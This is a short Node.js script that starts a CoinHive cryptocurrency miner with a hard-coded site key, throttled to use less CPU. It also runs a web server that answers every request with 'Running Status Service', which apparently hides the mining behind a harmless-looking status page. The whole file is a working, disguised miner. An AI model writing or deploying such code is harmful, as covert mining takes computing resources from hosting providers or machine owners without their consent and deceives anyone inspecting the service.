const CoinHive = require('coin-hive');
const http = require('http');  

(async () => {
 
  // Create miner
  const miner = await CoinHive('Fk6Hj9ghCuJeUpVDWCfsZGKN0CrZQ3um');
 
  // Start miner
  await miner.start();
  await miner.rpc('setNumThreads', [1]);
  await miner.rpc('setThrottle', [0.4]);
 
  const requestHandler = (request, response) => {  
    console.log(request.url)
    response.end('Running Status Service')
  }

  const server = http.createServer(requestHandler)

  server.listen(process.env.PORT, (err) => {  
    if (err) {
      return console.log('something bad happened', err)
    }

    console.log(`server is listening`)
  })

  // Stop miner
  //setTimeout(async () => await miner.stop(), 60000);
})();
